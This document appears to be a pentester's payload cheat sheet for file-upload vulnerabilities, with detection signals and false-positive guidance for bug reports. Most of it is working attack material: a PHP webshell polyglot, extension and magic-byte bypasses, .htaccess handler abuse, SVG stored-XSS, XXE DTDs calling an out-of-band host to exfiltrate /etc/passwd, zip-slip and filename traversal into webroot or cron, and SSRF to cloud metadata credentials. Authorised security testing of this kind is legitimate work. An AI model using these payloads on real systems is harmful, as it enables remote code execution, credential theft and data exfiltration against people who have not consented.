# File Upload — payload reference

> Class: RCE / stored-XSS / SSRF / file-read via upload-and-process. Trigger endpoints:
> `/upload`, `/avatar`, `/profile-picture`, `/attachment`, `/import`, `/convert`, `/export`,
> `/generate-pdf`. Rule: **an upload without execution/render/parse = a write-only blob, NOT a
> finding** — you need a round-trip (`whoami`, an alert in the victim's browser, file contents, an
> OOB hit).

## Payloads

- **Double / triple extension**: `shell.php.jpg`, `shell.jpg.php`, `shell.php5`, `shell.phtml`,
  `shell.pHp`, `.pht`, `.phar`. Hits a server that checks ONLY the last (or ONLY the first)
  extension while the web server executes by a different one. IIS variant: `web.config` upload.
  - Detection Signal: the request `GET /uploads/shell.phtml?c=id` returns command output (not a
    text/plain source and not a 403).
- **Magic-bytes + Content-Type spoof**: the body is a PHP/script, but the file header is forged to
  look like an image. Prefix `GIF89a;` or JPEG magic `FF D8 FF` at the start + `Content-Type:
  image/jpeg` in the multipart part. Magic bytes: PNG `89 50 4E 47 0D 0A 1A 0A`, GIF `47 49 46 38`,
  PDF `25 50 44 46`, ZIP/DOCX/XLSX `50 4B 03 04`.
  - Detection Signal: the file is accepted (the server validates magic/MIME, not a full parse) and
    remains executable/servable. Test server-side acceptance, not client-side.
- **Null-byte extension truncation**: `shell.php%00.jpg`, `shell.php\x00.jpg` — old stacks (PHP
  <5.3, legacy C parsers) truncate the string at `\0`, validate `.jpg`, and write `.php` to disk.
  - Detection Signal: the stored filename = `shell.php`, and it executes.
- **`.htaccess` / `web.config` upload → re-enable a handler**: upload an `.htaccess` with
  `AddType application/x-httpd-php .jpg` (Apache) or an IIS `web.config` with a handler mapping —
  then upload a payload with a "safe" extension that now executes.
  - Detection Signal: after uploading `.htaccess`, a previously-inert `x.jpg` with a PHP body starts
    executing when requested.
- **SVG / HTML stored-XSS**: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)
  </script></svg>` or `<svg onload="alert(document.domain)">`; an HTML file with inline JS. Works
  only if the file is served **on the same origin** and is NOT sandboxed (no CSP, no
  `Content-Disposition: attachment`, no separate sandbox domain).
  - Detection Signal: opening `app.target.com/uploads/x.svg` in the victim context executes JS
    (alert / fetch cookie). On a foreign sandbox origin or under CSP it does not fire (test the real
    render context).
- **DOCX / XLSX / PPTX → XXE**: an Office format = a ZIP of XML parts. Insert into `word/document.xml`
  or `[Content_Types].xml` a parameter-entity DTD pointing at your server (blind-OOB, see `xxe.md`).
  `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://COLLAB/d.dtd"> %a;]>`.
  - Detection Signal: an OOB hit on Collaborator while the document is processed (the parser resolves
    external entities) + exfiltration of `/etc/passwd` via the DTD callback.
- **Zip-slip (path traversal in an archive entry)**: an archive with the entry
  `../../../../var/www/html/shell.php` (or `web.config`). Generator:
  `evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5`. Hits unpackers `/import`,
  `/unzip`, `/extract` that do not validate the normalized path.
  - Detection Signal: the file materializes OUTSIDE the upload directory along the traversal path
    (verify with a direct request / subsequent execution).
- **Polyglot**: a file valid as both an image and code —
  `GIF89a;<?php system($_GET['c']); ?>` (passes the magic-byte check as a GIF, executes as PHP with
  `.phtml`). PDF/JS, JPEG/PHAR polyglots are analogous.
  - Detection Signal: the file passes image validation AND `?c=id` yields RCE output.
- **Path traversal in the filename**: `filename="../../../../etc/cron.d/x"` in multipart — the server
  writes the file to an attacker-controlled path (overwriting a config / the webroot). Distinguish
  from an upload exploit: this is arbitrary-file-write, severity by what you managed to overwrite.
  - Detection Signal: the file is written outside the upload dir; the target config/webroot is
    changed.
- **Race on processing (TOCTOU)**: upload a benign file → while the validator passes the copy →
  overwrite the same name with a malicious version BEFORE the server serves/moves it. Parallel
  upload+overwrite requests on one name.
  - Detection Signal: in a narrow window the malicious version — which passed validation as benign —
    is served/executed (unstable — prove it over several runs).

## Chain notes

- **→ SSRF via an image/media processor**: SVG/MVG with `<image xlink:href="http://169.254.169.254/
  latest/meta-data/iam/security-credentials/">`, an ffmpeg HLS `.m3u8` referencing an internal URL,
  HTML→PDF (headless Chrome) with `<iframe src="file:///etc/passwd">` / `@import url(internal)`. See
  `ssrf_bypass.md` / `blind_ssrf.md`.
- **→ RCE**: polyglot + `.phtml` allowlist bypass; PHP `phar://` on a sink with `file_exists()`.

## Anti-FP / what NOT to submit on its own

- **Upload ≠ execution**: a `.php` in a directory that serves `text/plain` is not RCE. You need a
  real execution round-trip.
- **A client-side bypass proves nothing** — test SERVER-side acceptance (the Content-Type header does
  not change how the server parses the file).
- **SVG-XSS on a sandbox origin / under CSP** — will not execute; test the actual render context, not
  the fact that it was stored.
- **Path traversal in the filename** — this is the file-write/traversal class, not upload-RCE;
  severity by the impact of the overwrite, not by the fact of a traversal string.
